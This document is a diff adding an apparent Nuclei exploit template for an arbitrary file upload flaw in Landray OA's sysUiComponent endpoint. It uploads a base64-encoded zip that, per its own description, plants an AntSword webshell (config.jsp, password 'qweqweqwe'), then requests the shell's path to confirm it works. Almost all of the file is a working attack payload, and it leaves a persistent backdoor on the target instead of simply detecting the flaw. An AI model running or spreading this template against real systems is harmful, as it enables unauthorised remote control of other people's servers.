@@ -1,0 +1,40 @@
+id: landary-AntSword-webshell-qweqweqwe
+
+info:
+  name: 蓝凌OA sysUiComponent 任意文件上传
+  author: ro1t
+  description: Landray-OA zip上传webshell,antsword 密码 qweqweqwe
+  severity: critical
+  tags: landray,oa,treexml,rce,vuln
+
+variables:
+  boundary: "{{to_lower(rand_base(20))}}"
+  filename: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: multipart/form-data; boundary={{boundary}}
+        
+        --{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.zip"
+        Content-Type: application/x-zip-compressed
+        
+        {{base64_decode("UEsDBAoAAAAAAJmGflwki9KHIwAAACMAAAANABwAY29tcG9uZW50LmluaVVUCQAD4TnKaeM5yml1eAsAAQT1AQAABBQAAABpZD1XaW9wCm5hbWU9Y29uZmlnLmpzcAp0aHVtYj0vdGVzdFBLAwQUAAAACAB8hX5cDnbcem4BAACKAgAACgAcAGNvbmZpZy5qc3BVVAkAA8s3ymnbOcppdXgLAAEE9QEAAAQUAAAAZVJhS8MwEP0rR2GQwox+EBFqRdQJgqLg/CR+SNOz7ciSLrm6jeF/99KuYyIUcnn38u7uXa8mN9CqCsEoW3Uc5MlCfasEtLOElubbliHCDZ3WtDSZrpUPSPn7/OHkMumfzqx2ZWOrPNmDk2u4mpDfwk4bFQI8b41TJXpgFbRlgLsIPw3YbsyKY1SnsAtdy6hOs5+2K0yjh2dQIYliS/jxCQWzPFLnLfRkWeJXY7HniWIKZ1MopEFbUc0qP2/kuU3om+IYcvC46jCQZM1X5dUSiSsmqzUOX5Jmf5qKlmzoGMphXntUpdSd99Gu/ibSqHj3jy7S7ODFcgxysLg+eCT+F0mzcVw+AvPjgmRHjZG3KuDFeSx2j7yEWIE9iJEYp9yPAGo48kNhORoZ0uylWKAmcJweeJJ7erSBlNXIXRfOGVQW2C5looiTQyjiD7AfNM1cR7Jlj8lYMeTZdtCKdA1ittHYUuNYhdf2h8qsyfUvUEsBAh4DCgAAAAAAmYZ+XCSL0ocjAAAAIwAAAA0AGAAAAAAAAQAAAKSBAAAAAGNvbXBvbmVudC5pbmlVVAUAA+E5yml1eAsAAQT1AQAABBQAAABQSwECHgMUAAAACAB8hX5cDnbcem4BAACKAgAACgAYAAAAAAABAAAApIFqAAAAY29uZmlnLmpzcFVUBQADyzfKaXV4CwABBPUBAAAEFAAAAFBLBQYAAAAAAgACAKMAAAAcAgAAAAA=")}}
+        --{{boundary}}--
+      - |
+        GET /resource/ui-component/Wiop/config.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_1,'fdThumbnail') && contains(body_1,'Wiop')"
+          - "status_code_2==200 && contains(body_2,'java.lang.NullPointerException')"
+        condition: and
